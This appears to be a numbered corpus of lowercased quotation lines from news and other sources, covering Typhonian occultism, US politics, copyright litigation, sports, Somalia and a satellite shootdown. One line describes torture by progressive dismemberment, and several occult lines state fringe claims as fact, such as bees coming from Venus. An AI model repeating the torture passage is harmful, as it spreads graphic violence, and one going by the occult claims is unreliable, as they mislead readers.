7540084 our work is therefore historically authentic the rediscovery of the sumerian tradition
7540085 lincolns researches have undoubtedly illumined certain phases of an ancient myth cycle intimately associated with the typhonian current they reveal a possible connection between an historic lineage the merovingian and the typhonian tradition
7540086 based on initiated knowledge or gnosis of the fire snake
7540087 the feminine aspect of set sometimes typified as the mother of set in her role of goddess of the seven stars of which set is the eighth
7540088 the word set or sut means black this indicates not only the generative nature of this god but also his association with the night world amenta for from being a god of the heavens set fell beneath the horizon and was recognized in later mythologies as the lord of hell the hidden land this god is of supreme importance in crowleys cult being not only the name of the primal creative spirit but also the formula of sexual magick
7540089 of the forces of the waters which were supposed to resist light and order a number of beasts which dwelt in the water were regarded as symbols of him and of beings wherein he took up his habitation
7540090 the beast is the sea goat or amphibious monster identical with cthulhu the quinotaure or bull of the deep
7540091 the waters under the earth home of the ancestors or subconscious atavisms of the race
7540092 the intersection of this surface horizontal and vertical represent therefore the gateway to another dimension the waters beneath the earth that mirror in their uncertain depths the heights of space above the earth wherein glow the stars the unborn or un fleshed souls of future states of consciousness or simply life beyond earth the mortal world spreads east and west and the land of le invisibles lies above and below it in the vertical dimensions of height and depths north and south horus and set
7540093 i now incline to believe that aiwass is not only the god or devil once held holy in sumer and mine own holy guardian angel but also a man as i am insofar as he uses a human body to make his magickal link with mankind
7540094 vivo a corrupt form of oviz or aiwaz the god worshipped in ancient sumer and identical with set or shaitan
7540095 this void was known as elemi a name which is said to be incommunicable it was the equivalent of el or al continued in the draconian cults as el shaddai or al shaitan the stellar deity worshipped by the arabs and the jews and by the earliest settlers in sumer in sumeria the god el is also known as ia alemi or alhim became the elohim of biblical lore these gods or cosmic powers poured through the veil of the ain the all seeing eye which has its human analogue in the ajna chakra concentrated in the first power zone kether
7540096 the letter m the key vibration of the plane of the elder gods is represented mythologically as the sea goat makaru or as the crocodile the beast of the waters
7540097 of set because set is the seat of the powers manifest as the tree of life
7540098 animals with red or reddish brown hair or skins were and even red haired men were supposed to be especially under the influence of set
7540099 it should be noted that the graal bearer represented on the tarot card is depicted in amber coloured armor amber or red the color associated with the merovingians amber or orange appears repeatedly in accounts of ufo sightings
7540100 the charioteer is clothed in the amber coloured armor appropriate to the sign he is throned in the chariot rather than conducting it because the whole system of progression is perfectly balanced his only function is to bear the holy grail
7540101 the bearer of the graal knight templar depicted on atu vii the tarot card may therefore be identified with the bringer to earth of the sangraal or blood royal the blood which flows in the veins of the kingly man extolled by crowley although not understood by him in the sense of trans human intelligence crowleys design for the graal resembles as closely as may be for a pre 1947 representation a shape frequently described in connection with particular types of ufo
7540102 in the holy blood and the holy grail the authors reproduce the family crest of clan plantard the contemporary representative of which was until recently the grand master of the prieure de sion an order which according to lincoln dominated the order of the knights templar and various other highly influential institutions which at certain periods of history included the vatican the crest which supplies the key to the current represented by the merovingian bloodline and the order of sion comprises the symbols of the typhonian line of descent the two bears eleven bees and the fleur de lys the motto incorporated in the crest reads et in arcadia ego ed note see top pic arcadia 127 which is the number of the egyptian goddess heqt who was typified by the lower part of the back or haunch the two bears denote the mother typhon and her son set the image of the bee pictorializes the buzzing or humming vibration peculiar to the outer ones or their vehicles eleven is the number of those who are without or beyond the tree of life thus identifying the outer ones
7540103 the merovingian kings from their founder merovee to clovis who converted to christianity in 496 were pagan kings of the cult of diana
7540104 the bee beetle or crab is therefore the link between the earliest manifestation of the typhonion current and its final phases
7540105 217 is the key number of crowleys the book of the law
7540106 for i am not appointed to guard thee but we are of the blood royal the guardians of the treasure house of wisdom
7540107 illumined certain phases of an ancient myth cycle intimately associated with the typhonian current
7540108 the beehive is found in masonry as a reminder that in diligence and labor for a common good true happiness and prosperity are found the bee is a symbol of wisdom for as this tiny insect collects pollen from the flowers so men may extract wisdom from the experiences of daily life the bee is sacred to the goddess venus and according to mystics it is one of several forms of life which came to the earth from the planet venus millions of years ago wheat and bananas are said to be of similar origin this is the reason why the origin of these three forms of life cannot be traced the fact that bees are ruled by queens is one reason why this insect is considered a sacred feminine symbol in india the god prana the personification of the universal life force is sometimes shown surrounded by a circle of bees because of its importance in pollenizing flowers the bee is the accepted symbol of the generative power at one time the bee was the emblem of the french kings the rulers of france wore robes embroidered with bees and the canopies of their thrones were decorated with gigantic figures of these insects the fly symbolizes the tormentor because of the annoyance it causes to animals the chaldean god baal was often called baal zebul or the god of the dwelling place the word zebub or zabab means a fly and baal zebul became baalzebub or beelzebub a word which was loosely translated to mean jupiters fly the fly was looked upon as a form of the divine power because of its ability to destroy decaying substances and thus promote health the fly may have obtained its name zebub from its peculiar buzzing or humming inman believes that baalzebub which the jews ridiculed as my lord of flies really means my lord who hums or murmurs
7540109 if biden gives that little extra boost to obama in places like the scranton wilkes barre area in a tight race like the 11th its a nice add on for kanjorski

7540147 a t its core schip is pegged to the prevailing market for third party coverage rather than to child development principles as health insurance products seemingly drift ever downward in scope and depth so can schip
7540148 has never been equaled in other forms of health insurance
7540149 but as a result of either drafting clumsiness seen in other dra provisions or deliberate drafting ambiguity the legislation raises serious uncertainties regarding how well the epsdt safeguard will function in practice
7540150 to sacrifice this vision for the sake of insurance markets is to lose not only coverage but the ethical basis of child health financing

7540245 nobody has gotten into adding more nutritional value into gum
7540246 retailers are putting it on the shelves but we still have to move it

7540250 he might have more luck selling at a premium price in places such as bubble tea stores juice bars or oxygen bars than trying to land convenience stores
7540251 he needs to really identify and home in on his unique selling proposition
7540252 hes created something different than wrigleys and maybe it is truly unique enough to get people buying but if its really successful it would be knocked off shortly
7540253 theyve managed to make their name on being a unique brand rather than on the taste of their pop
7540254 they have pictures on their labels and they do crazy promotions theyve carved out a niche that is very independent from pepsi and coke

7540273 bush daddy has kept pestering me about the issue of living dismemberment probably thinking that this is what it means when psalm 53 5 says that god will scatter the bones of those camping against you bush daddy says this means that the limbs of the designated target will be duct taped and cut off each time the person revives another limb will be cut off and or shortened until he or she succumbs

7540322 we had lost hope that my brother would be released

7540332 we were arrested and taken to a university for questioning
7540333 we were held for nearly 24 hours without any sleep and having interrogation of up to about eight hours
7540334 then we were moved to a detention centre and before we were allowed any sleep we had another 12 hours of interrogation
7540335 the guys i was with were given the reason that it was illegal to undertake even a peaceful protest and to talk about the situation in tibet
7540336 they seemed to have decided to really clamp down on protesters
7540337 she has an absolute commitment to the cause and even though i wouldnt like to say that china has listened only time will tell if they have
7540338 i didnt decide to run for president to start a national crusade for the political reforms i believed in or to run a campaign as if it were some grand act of patriotism in truth i wanted to be president because it had become my ambition to be president in truth id had the ambition for a long time

7540341 these opinions obviously have been a long time coming and have been considered quite thoroughly briefed quite thoroughly and argued quite thoroughly
7540342 we are very gratified by the opinion of the 11th circuit and most recent opinions by the 2nd circuit on contract issues
7540343 has been all about preserving 120 years electronically so it would be preserved for all time
7540344 national geographic has the privilege of reproducing these individual magazine issues in print as often as it wishes and greenberg retains his copyrights in his individual photographs at the same time national geographic has a copyright in the collective work as a whole to wit the individual magazine issues
7540345 isolated from the context of the original print publications in which they first appeared
7540346 because the freelance authors articles were presented to and retrievable by the user in isolation clear of the context of the original print publication
7540347 the addition of new material to a collective work will not by itself take the revised collective work outside the privilege
7540348 the conversion of magazine issues from print to digital form as opposed to their conversion from print to print or print to microform does not create a different balance of copyright protection between individual authors and publishers
7540349 the authors artists and creators should share in the publishers profits
7540350 the publishers are bereft of logic legal merit and are totally disingenuous
7540351 have changed their legal position in this case more than a politician running for election just as the chameleon politician changes position with the most recent poll our appellants have changed their legal position and rationales as the tasini case worked its way through the courts
7540352 histrionic speculation and contention that a decision in favor of greenberg would lead to the wholesale purging of their electronic archives information destroying purges loss of recorded history massive destruction of constitutionally protected information etc
7540353 this often repeated but seldom analyzed threat is totally specious
7540354 between history being available to the public in archives and history as a consumer product sold to the public in mass merchandised cd roms or databases if publication isnt limited to the former history need not be lost or even inconveniently stored
7540355 it will just not be a profitable commodity as the publishers here have endeavored to make it
7540356 the reader should understand the pecuniary or commercial positions of the parties and their constituencies in this dispute
7540357 on one side there are the artists authors and other creators of copyrightable works who argue that their creative contributions to collective works already exploited by publishers should not be further exploited by those publishers without sharing the profits realized by that further commercial exploitation
7540358 on the opposite side the publishers are seeking to generate new revenues by repackaging an old product the old wine in new bottles paradigm updated in this instance with an easier access twist off metal cap rather than a cork here the new packaging of the old content replicated but unrevised in electronic medium is both cost efficient profitable and attractive to a new computer savvy generation of consumers moreover the profits are enhanced exponentially when the publisher can exclude the contributing artists authors and creators of the content from sharing in those profits at the end of the day this case is not about education access by the masses or efficient storage and preservation it is about who gets the money

7540368 i used to sell strips to weekly leftist newspapers i was in sympathy with them but they were deadly dull so i felt they could use a comic strip modeled on old comics
7540369 more into traditional comic strips like chester goulds dick tracy which seemed outrageously weird when seen from a grownup perspective other strips i enjoyed included bob montanas archie peanuts b c the wizard of id miss peach and the old e c stuff especially the original run of mad when it was still a comic book
7540370 i took the ambience from real life and used gags that used to be based around alcohol and substituted marijuana for the booze take the one about the hippy getting busted on a possession charge and being told by the arresting officer that he had one phone call the guy uses that call to get a pizza delivery

7540384 if you could knock them out specifically you might be able to just treat psoriasis without the unwanted side effects of more general immune suppression

7540391 we are in for a long battle as the floods have come in areas which are not prone to it
7540392 contemporary art constantly expands its boundaries so its only fitting that we should too
7540393 we were delighted to see the number of applications increase once again and to see such high quality work coming from artists
7540394 by expanding the geographic range of these awards the efroymson contemporary arts fellowship is also expanding the awareness of indianapolis as a cultural leader
7540395 i applaud the efroymsons for their support of the arts and for demonstrating that contemporary art has a home in central indiana and beyond
7540396 we have recently commenced proceedings against parties involved in the production and distribution of a movie entitled hari puttar
7540397 however it is our policy not to discuss publicly the details of any ongoing litigation
7540398 we registered the hari puttar title in 2005 and its unfortunate that warner has chosen to file a case so close to our films release
7540399 in my opinion i dont think our title has any similarity or links with harry potter
7540400 interestingly one group that over consumes the mini packs is chronic dieters individuals constantly trying to manage their weight and food intake
7540401 on the one hand consumers perceive the mini packs to be a generous portion of food numerous small food morsels in each pack and multiple mini packs in each box on the other hand consumers perceive the mini packs to be diet food for chronic dieters this perceptual dilemma causes a tendency to overeat due to their emotion laden relationship with food
7540402 while restrained eaters may be attracted to smaller foods in smaller packages initially presumably because these products are thought to help consumers with their diets our research shows that restrained eaters actually tend to consume more of these foods than they would of regular foods
7540403 my goal was to bring myself and my personality into this project i have been wearing extensions for years and there is nothing out there like this product every woman should have one
7540404 we were friends before we were a couple and were always going to be friends

7540411 bisogna andare fino in fondo a milano i dati sul consumo di alcol alla guida continuano a essere allarmanti su 370 accertamenti della polizia municipale eseguiti lo scorso luglio nellarco della settimana e con intensificazione nei weekend 79 sono risultati positivi ai test etilometrici praticamente uno su cinque
7540412 its an area known for avalanches it the ice regularly breaks off here
7540413 they were in the trail but the problem was that the avalanche swept away the trail
7540414 the guide shouted run fast run fast it didnt make any noise it really was impressive
7540415 we had just enough time to move away to the right before getting hit we were really lucky
7540416 from the moment we could locate them with radar echo and surface analyses it was already five hours after the avalanche so theres no more hope
7540417 i had the flu when i arrived i had pretty hard fevers pretty much every day and low energy i also had quite a big problem with a spasm in my neck which kind of nearly did lead to me not racing this weekend
7540418 fortunately ive got a great doctor who was with me the whole way through it it was so bad that i was struggling to basically stand up and so i had to have injections in my neck and take plenty of painkillers
7540419 i think the key point of this weekend was qualifying managing to put my car in third position it turned out that we had even more fuel than the top two cars so it was quite a good achievement
7540420 but we have to be realistic and i think the true pace of our car is more similar to the race than in qualifying
7540421 we struggled a bit more than ferrari and mclaren on the long stints as soon as the tires get a bit used then the car starts sliding too much and you cannot do anything
7540422 after qualifying i knew that my weekend was going to be difficult at the start i was touched by nakajima and i lost my rear wing my mechanics did everything to try and allow me to continue but my race was already compromised
7540423 i am extremely disappointed because i was hoping to have a special race in my second home grand prix and for the supporters who came here this weekend to support me
7540424 if you dont watch it ill charge you for that first leg too
7540425 dont worry about it go to your flight and ill handle it
7540426 the proliferation of crime could not have happened without years of protection and impunity
7540427 and the first step is getting it out of our own house
7540428 money is important in life it does not give you happiness we all know but it sure calms the nerves
7540429 there is no reward in life without risk and there are times in our lives when we must all balance risk against reward and make a decision accordingly whether we want or not
7540430 the evolution of ace from a struggling flag carrier into money making holding company is the story of turning side dishes into main courses
7540431 you can have any color you want so long as it is black
7540432 were not going to be able to do anything with our out of control federal spending until we do something about those earmarks
7540433 being a small business owner and understanding the basic premise that government should have a balanced checkbook thats pretty important to me i believe like other mark warner style democrats that understand that government has a role and we want it to play that role in an efficient manner but also we know that weve got to be fiscally responsible about things
7540434 balancing the budget is a matter of national security we are undermining our economy by continuing with this deficit spending that is why when i get elected to congress i will be pushing to caucus with the blue dog democrats
7540435 im delighted democrat sam rasoul will join the congressional blue dog coalition once elected promoting fiscal conservatism and accountability and reform in government has this blue dog running in circles and wagging his tail about candidate sam rasoul
7540436 ive decided its time for a change im voting for sam
7540437 honestly president george bush and his gop congressional leadership should be receiving a go to jail card for bankrupting our nations economy and the resulting higher food and fuel cost which is sending all of us to the poorhouse
7540438 rep goodlatte talks a lot about conservative tax policy but its really a mixed bag with him if you look at the truly conservative people in the district theyre seeing a problem with the amount of deficit spending and the national debt i think theres some vulnerability there as far as what rep goodlatte is saying
7540439 anyone who is not shocked by quantum theory has not understood it
7540440 i think it is safe to say that no one understands quantum mechanics
7540441 we did it to provide support and help in promoting soccer in the west monroe community the players volunteered to take time out from their busy preseason training used their own cars to drive to west monroe and help i am so immensely proud of them all
7540442 everyone had so much fun and many a parent came up to me afterwards to express their thanks and gratitude
7540443 i believe today helped spread the word about louisiana tech athletics and showed the public a very positive image of the department and our program
7540444 many parents came up to me to express their gratitude for putting on such an event and our players too gained a lot from the day
7540445 we felt it important to not only help the kids with soccer but the parent coaches too hence the chance for them to see a typical practice session at the ncaa division 1 level
7540446 by helping the coaches we help the grassroots training of all the young players we hope our involvement in such events will lead to an increase in the amount of children playing soccer receiving good coaching and going on to help the area play soccer at a higher level than has been seen before i hope this then has an effect on tech soccer with a bigger influx of soccer recruits coming from our local communities and into our program in the future pele described soccer as the beautiful game and after seeing our players interact with so many children and parents in such a positive way i can now see why

7540459 let me ask you a question what makes a pole snap before the rush of a storm what makes a brick wall give way before a sudden wind and why does a tree or a reed bear the storm easily
7540460 because the tree and the reed are elastic enough to give a little to bend instead of breaking
7540461 our small nipa hut high in the air sways a little but rides out the storm every pole every beam and every rafter of the frame is all made of hollow bamboo bamboo is stronger than steel because it bends and gives and then springs back there is no nail in the house every crosspiece is tied with rattan the same vine with which you make cane chairs so you know how strong and elastic it is
7540462 and of what are the sloping roofs and the side walls made

7540469 you know that our countrys population is declining by an average of almost 700 000 people a year we have raised this issue on many occasions but have for the most part done very little to address it first we need to lower the death rate second we need an effective migration policy and third we need to increase the birth rate
7540470 ha affermato che la chiesa non in quanto tale un soggetto politico
7540471 la chiesa ha aggiunto bagnasco non e non pu essere neutra o indifferente rispetto a qualunque posizione anche se come soggetto in quanto tale non entra nellagone politico i credenti come tutti i cittadini entrano nella politica nel gioco della democrazia con la propria coscienza come tutti e allinterno del dinamismo democratico portano avanti una visione delle cose che in parte nasce chiaramente dalla propria fede e in altra parte anche dalla luce della ragione quindi non necessariamente tutte le posizioni dei politici cattolici o comunque della comunit cristiana quando si esprime o degli stessi vescovi a volte quando si esprimono sui principi generali sono di tipo confessionale bisogna distinguere alcuni si ma altri per quanto riguarda il valore della persona umana della vita umana della societa della famiglia e cosi via sono valori che sono di ordine innanzitutto naturale razionale

7540487 she is a smart sassy lady and one of americas most successful songwriters we know she will bring a new level of energy and excitement to the show
7540488 we had originally intended for american idol to have four judges
7540489 weve seen from our international series that having a fourth judge creates a dynamic that benefits both the contestants and the viewers
7540490 for the past seven seasons paula has had to endure the experience of being the only woman at the judges table shes been as an island of consideration and gentle criticism between randy and simon offering her invaluable expertise as a performer and no 1 artist to the thousands who have competed on american idol with kara by her side paula finally has some back up and now there is going to be a lot more girl power on the show

7540509 coalition ships are in the area as part of our continual presence in this region while they have conducted routine operations in the area in the past the establishment of the mspa will focus the efforts to counter destabilizing activities in the region and improve security while long term initiatives mature
7540510 the situation in this region is grave we are seeing at least one attack every couple of weeks these pirates are not afraid to use significant firepower in attempts to bring vessels under their control unless further action is taken seafarers remain in serious danger whilst navigating the gulf of aden in all reported instances vessels have been approached by speedboats containing men armed with machine guns and rpg launchers in their attempts to slowdown and board the vessels the pirates have opened fire against the unarmed merchant ships
7540511 i think its extremely important just to keep making forward progress rather than trying prematurely to come to some set of conclusions

7540513 there is a lot of work ahead to do that and obviously its a complicated time but its always complicated out here
7540514 this is something that matters a lot to the palestinians it matters a lot to the palestinian people and it is obviously a sign of good will
7540515 on both sides the israelis and the palestinians have work to do

7540520 it is our sincere hope that senator collins is now ready to discuss the most important issues making quality affordable health care choices accessible to everyone reversing the damage to middle class maine caused by the bush economic policies putting the interest of mainers over the interest of oil companies and setting a deadline for withdrawal to bring our troops safely and responsibly home from iraq
7540521 really the choice of joe biden in my opinion is tantamount to an admission barack obama himself lacks the necessary experience to be president

7540550 everyone on this high a level of football knows what they have to do if im on the sideline thats part of sports and thats not a good reason why toronto is 3 5
7540551 as a quarterback you know youre one play away from being in there but that turned into three or four games away there were opportunities for me to play but they gave kerry money up front and they felt he was the answer but you get what you pay for and toronto is 3 5 right now

7540569 we have to come to the realization as harsh and brutal as it is is that 70 percent of our students are in at risk categories
7540570 and if you take maybe four or five schools out of our school system that number probably goes up into the 90s
7540571 people point at our completion rate of a little over 50 percent between all the different ways you can complete a high school degree they almost accuse the school system of doing something to run off 50 percent of the students well were no more running off 50 percent of the students than the average school district in the state is running off 30 percent considering the completion rate is about 70 percent statewide
7540572 we have been in a triage situation and what we have really put the resources towards are educating students
7540573 we were a school district in 2002 that was ripe for takeover by the state
7540574 these are 100 percent legitimate questions and thats the step that we have to make but at some point we had to stop sinking but now were dealing with and the next school board will have to deal with what has been just about a half decade of almost myopic focus on bringing the school district to a level of competency in terms of educating children now were saying how do we get to the next level how do we get to the point where more children are college prepared more children are workforce prepared more children are ready to deal with an international marketplace how do we get to that point
7540575 any cat found outside will be turned into chesterfield animal control
7540576 the cats love to use the freshly tilled soil its just not pleasant
7540577 trash can issues have also been brought up but no one knows whether its the cats or the raccoons
7540578 were not sure which ones are owned and which ones arent
7540579 i am an animal lover theres one feral cat that loves my backyard that looks very ill is skinny and losing hair and its very sad what am i supposed to do were not really sure the best way to handle it
7540580 we fine dog owners if someone reports a dog owner has not picked up after them were trying to find a way to please residents who have complained about the cat issue too
7540581 people here are so outraged they are just letting their cats stay outside the people that have instituted this rule theyve only lived here for around two years in other words they like dogs but they dont like cats
7540582 he doesnt bother anybody he stays on the porch and he comes in to be fed three times a day most of the cats out there stay close to their owners homes and they dont bother anybody theyre punishing everybody for pets where their owners dont adhere to the rules
7540583 its not like they bark i dont understand what the problem is if they can give me a good reason for this then i will listen
7540584 i cant imagine animal control is going to come by for something like that i find it hard to believe that anyone is even going to call them
7540585 if a cat is off of the owners property it is not a violation of state or county code
7540586 we havent really even discussed it we were hoping we would never have to get to that point
7540587 oh good they are trying to protect cats by asking their owners to keep them inside
7540588 books august 25th is officially plagiarism day and people around the world
7540589 may you always be happy and live a long life together
7540590 i think the area where we spent the most attention was how to actually write the health care plank because clinton had proposed that it be an actual mandate to purchase health care and obama had not were all in agreement that there needs to be healthcare coverage for every man woman and child in the united states
7540591 i dont think its a good thing to have both your president and vice president between them have 11 homes at a time when were in a housing crisis

7540595 learn a lot quicker than you are at the moment or you will have a short term job
7540596 the springboks will get worse if they continue in this way
7540597 mate no one in world rugby is playing the way their coach is talking about not successfully anyway everyone has discipline policies and a procedure in their game the way he is talking is nonsense you cant just play an expansive wide game
7540598 if de villiers keeps on going down this track he will be unsuccessful he has got to learn if he wants to coach at international level you have to have some sort of discipline involved then get the players to play for that the hard thing for peter is that he has never coached professionally an d this is one of the most difficult teams to coach
7540599 what they do demand is that you must be fitter and play better from un structured ball
7540600 but you dont need to go to a harum scarum type of game
7540601 but south africa have gone to the other extreme theyre attacking off everything and theyre going lateral not through defences you have to go through sides like australia and new zealand first south africas problem is if you have played one game then try to go to the other extreme thats a danger knowing the south african players i would say they would prefer much more discipline theres no structure in their game at present and they have lost all their discipline
7540602 they could turn it around even in 7 days 20it will be tough but they are a resilient bunch of players some of the toughest footballers i have ever been involved with
7540603 but he has to change his philosophy because it doesn t fit these players its not credible you have got to give players a framework to work under peters big test now is to learn if he learns he can turn it around but if he continues to be stubborn he wont last long because his tactics wont work

7540639 we are ready for talks with the government and the truce is an important development towards dialogue

7540651 somalia is now facing the worst security situation in the last 17 years with increased armed conflict and fighting targeting of humanitarian aid workers military build up increased sea piracy and political tension
7540652 this situation is severely undermining economic activities and humanitarian delivery thus contributing to the overall deterioration in the humanitarian situation
7540653 food prices both local and imported are at record historic levels and are still climbing
7540654 more and more people both rural and urban are falling into acute food and livelihood crisis and humanitarian emergency as they cannot cope poor and middle income households are becoming severely indebted
7540655 this is confirmed by recent nutrition reports that indicate a doubling of the caseload of severely malnourished children in acf feeding centers over the last three months in dhusamareb galgadud
7540656 there are a few small pockets of improvement but overall the situation is only getting worse for many somalis who cannot afford food even if it is for sale while malnutrition is on the rise
7540657 foreign cyclists drawn by the beauty of our country find practically nothing for them

7540662 i feel confident all the hard work we have done has shown real positive improvement
7540663 our base case is the opposition parties still need time to work through all the differences among the different parties in order to form a stronger alliance
7540664 despite strong trends we expect fdi to stay flat in fy09 at usd 32 2 billion posted last year

7540698 these cards underline what this society has decided to celebrate allow and announce
7540699 it seems to me that giving within the church is a mark of obedience to christ rather than an attempt to build up gods kingdom by our own abilities one thing to note however is that when we claim to be being obedient to christ while disengaging from our brothers and sisters in christ either by withdrawing funding or by physically refusing to be present our claimed obedience is a lie there are almost certainly things 815 could do to make obedience an easier cross for those on the conservative end of things to bear but obedience cant be predicated on those with authority making obedience easy

7540704 i doubt if the politicians promoting this have any idea what theyre promoting
7540705 you can store information using it you can communicate information using it
7540706 most of us who become mathematicians do so not because of our education but in spite of it
7540707 were turning kids off a subject that is useful and incredibly interesting and beautiful if taught correctly
7540708 i first took algebra in eighth grade from a bilious creepy teacher who called all the girls hon and all the boys son
7540709 at any age we will take the drudgery as long as we see a reason to do it
7540710 it takes the arithmetic youve learned and lets you answer questions not just 5 4 what it lets you change the unknown to 5 what 20
7540711 in fact if i had to design a mechanism for the express purpose of destroying a childs natural curiosity and love of pattern making i couldnt possibly do as good a job as is currently being done
7540712 i simply wouldnt have the imagination to come up with the kind of senseless soul crushing ideas that constitute contemporary mathematics education
7540713 im just not sure everyone can teach algebra so that the kids understand it and make it fun
7540714 scant attention has been paid to this critical issue and californias approach to math instruction still doesnt add up
7540715 my fear is its going to turn kids off and contribute to the dropout rate
7540716 we would not want to put an age level on it
7540717 some kids are not ready for algebra in the eighth grade
7540718 weve seen over the years if you try to accelerate that it just doesnt work at redwood we saw a lot of kids that came in and then had to repeat it again in the ninth grade
7540719 the kids are leaving fourth grade now that will be required systemwide to take the eighth grade algebra 1 test
7540720 we have three years to get them to grade level
7540721 stand firm in your refusal to remain conscious during algebra in real life i assure you there is no such thing as algebra
7540722 algebra the intensive study of the last three letters of the alphabet
7540723 the fact is that there is nothing as dreamy and poetic nothing as radical subversive and psychedelic as mathematics
7540724 i dont know anybody who uses algebra but im not hanging out with architects and engineers
7540725 algebra is the gateway to critical thinking pivotal for success in science engineering and technology
7540726 i was more interested in solving the mystery of the maidenform bra than i was in alge bra but the teachers got through to me
7540727 algebra definitely set me on a path to study the humanities literature and philosophy hold many complex concepts that lead to better critical thinking
7540728 at the risk of perpetuating the stereotype of librarians id be glad to state on the record that algebra is uniquely useless in life and that the only good number is a call number
7540729 i am 77 years old a retired priest of the episcopal church i nearly died trying to do algebra in 1946
7540730 what is always to be hoped is that the instructor will reach the kids natural curiosity math is actually fun and it is easy
7540731 the phenomenal performance of the jamaican athletes is also due to the cultural self confidence they feel this is not a confidence manufactured by the abjectly self conscious respectability seeking hymn singing english speaking middle classes but one bred out of the flamboyant boisterous in your face patwa speaking population
7540732 cracking down on supply without solving the problem of demand creates a vicious cycle that will only make crime in bermuda more violent than it already is
7540733 but we are managing the situation and we are going to present a balanced budget and we are going to meet our responsibilities
7540734 we have to stay focused on the prize and thats making sure our candidate is elected president
7540735 whats essential is that we repeal the defense of marriage act and that the federal government recognizes gay and lesbian marriages in those states that have same sex marriage laws
7540736 if this was a state platform you might see it
7540737 but california is still a couple of steps ahead of the curve on this issue
7540738 basically this document really has the impact of an ice cube on the tarmac in the central valley in august
7540739 so why put something in a document that doesnt mean anything and that allows the opposition to use it for their advantage
7540740 its been a bit of a crazy time july was our best month ever we sold over 60 bikes
7540741 a lot of moms come in and want something they can use to run down to the store and pick up a few things
7540742 as gas hit 3 50 then 4 they started getting sick of taking their suvs out

7540745 in the market street corridor theres been a significant shift to bicycles for commuting
7540746 i dont think anyone could stand on the sidewalk during the commute and not notice it
7540747 now at 10 a m market street is like rush hour
7540748 and at rush hour its nuts it tends to be raceway
7540749 theyve been doing this for years in europe theres no reason the bay area cant emulate that
7540750 everyone has to learn so that they can one day teach
7540751 there was a different temperature to them a different flavor
7540752 in one we were able to see that it was best dealt with as a diversion counseling issue the girl was nearly dead and we thought it was a crime
7540753 one of our officers taking a juvenile home or otherwise releasing them to a parent is by far the most common way the cases are resolved
7540754 this reprimand and release does not create a formal report
7540755 if these kids are caught by law enforcement with alcohol there needs to be a citation
7540756 when they catch you they just pour out the rest of your drink
7540757 they might warn you and say next time youre going to get a ticket or something but it never happens
7540758 police officers want to give kids a second chance but having a consistent response is important if its inconsistent the message is that you might get away with it sometimes
7540759 its unlikely he would be charged if anything he would be referred to a counseling situation
7540760 men tend to tolerate alcohol better and can get away with drinking more
7540761 but thats still a heck of a lot of alcohol in a short period of time
7540762 we are dealing with the parents and child from a diversion standpoint but not a prosecution one

7540781 we are in for a long battle as the floods have come in areas which are not prone to it
7540782 one thing i can think of off hand is that i have tried a few times to drive slower on the highway at least the posted speed limit and stay over to the right and i still get ran over or feel the anger of other drivers just wondering how many others have experienced the same thing
7540783 im delighted to welcome such a diverse group of member companies

7540786 i have a suspicion that may have been the convincing argument that the premier rocket scientist in the country would admit that we just werent smart enough
7540787 the concern was that it would have been out of step with shuttle and shuttle replacement at nasa and it might not be a popular alternative to expendable launch at the air force
7540788 my contribution if any was keeping the bureaucracy off the back of the small team
7540789 arriving at the pad at around 4 30 in the morning and seeing the damage was appalling
7540790 a pall of failure hung over the team as we surveyed the damage there was no way we were going to fly that day
7540791 he looked at all of us got us in a huddle and said we have the opportunity to make history here today
7540792 i think at the time no one thought you could make revolutionary space capabilities for 60 million so it was under the radar horizon
7540793 one of the reasons i think we havent seen an effective follow on to dc x in the 15 years since is because you guys were good enough that you very effectively caused the radar to be angled a lot closer to the horizon
7540794 one of the reasons i think we havent seen an effective follow on to dc x in the 15 years since is because you guys were good enough that you very effectively caused the radar to be angled a lot closer to the horizon
7540795 if we had another four years we could have at least gotten to the suborbital stage and i could have shown the benefits of the program
7540796 then we would have been on a viable path to wherever we wanted to go
7540797 the purpose of x 33 was to demonstrate that you need expendables and by golly it did that
7540798 but we learned as much from those failures as we did from the successes
7540799 im not sure exactly where id put it but i wouldnt put it inside the missile defense agency
7540800 the missile defense agency has become too large and too bureaucratic
7540801 hes going to give it to nasa why wouldnt he its the space agency isnt it
7540802 following the logic of henry v many of you in this room are my brothers and weve earned some scar tissue together we display it today with some measure of pride and fond memories not only for our esprit de corps but for having accomplished something new worthwhile and we hope long lasting
7540803 the top orbiter symbolizes the continuing dynamic nature of the space shuttle program the bottom orbiter a black and white mirror image acknowledges the thousands of unheralded individuals who work behind the scenes this mirror image symbolizes the importance of their contributions
7540804 we were operating on the margins of a system well engineered for a different job
7540805 the claim there was a danger from the fuel is not the most preposterous thing the pentagon has ever said but it seemed to be a bit of a stretch
7540806 the cynic in me says that the idea that this being done to protect the lives of humans is simply a feel good cover story tossed to the media having the us government spend millions of dollars to destroy a billion dollar failure to save zero lives is comedic gold
7540807 the official explanation seems a bit thin it was a surfeit of caution
7540808 the analysis that weve done is as certain as any analysis of this type can be
7540809 the hydrazine tank will survive intact because the hydrazine in it is frozen solid not all of it will melt so you will land on the ground with a tank full of slush hydrazine that would then later evaporate
7540810 under various assumptions we got different probabilities of human risk from the uncontrolled entry of this satellite
7540811 but they were all much riskier than the accepted standard
7540812 in the history of the space age there has not been a single human being who has been harmed by man made objects falling from space so there has to be another reason behind this
7540813 under various assumptions we got different probabilities of human risk from the uncontrolled entry of this satellite
7540814 but they were all much riskier than the accepted standard
7540815 it varied depending on which experts we talked to but we got anywhere between 1 in 45 and 1 in 25 chance of that occurring
7540816 clearly nothing prior to usa 193 rose to that level
7540817 the risk posed was much higher than any risk weve ever seen
7540818 if it had just been hardware we would never consider these extraordinary measures
7540819 the odds of injuring many people was much higher then wed seen in the past
7540820 if it had just been hardware we would never consider these extraordinary measures
7540821 the tank is unlikely to make it through the heat and aerodynamic violence of the plunge that awaits it meaning it will spill its contents high in the atmosphere
7540822 hydrazine requires a tremendous amount of energy to go from solid to liquid
7540823 under the initial conditions and modeling techniques described above it was found that the n 2 h 4 located inside of the titanium tank does not reach its melting temperature the n 2 h 4 would have needed to absorb 43 15 mj of energy to reach 275 k its melting point from the start temperature of 214 k it only absorbed 29 34 mj or about 68 of that
7540824 they simply dont have the expertise to do the analysis its just not easy
7540825 most important is re radiation a lot of the heat doesnt go into the object
7540826 written in apparent ignorance of well established heat transfer relations for spacecraft reentry simple estimates of the total heat transfer to the tank upon reentry available in any number of aerospace textbooks show that the heating of the tank would probably not have been sufficient to melt the hydrazine entirely much less vaporize or ignite it
7540827 how could we look somebody in the eye who had relatives killed or injured how could we have that conversation
7540828 theres a risk that people will say its an asat test
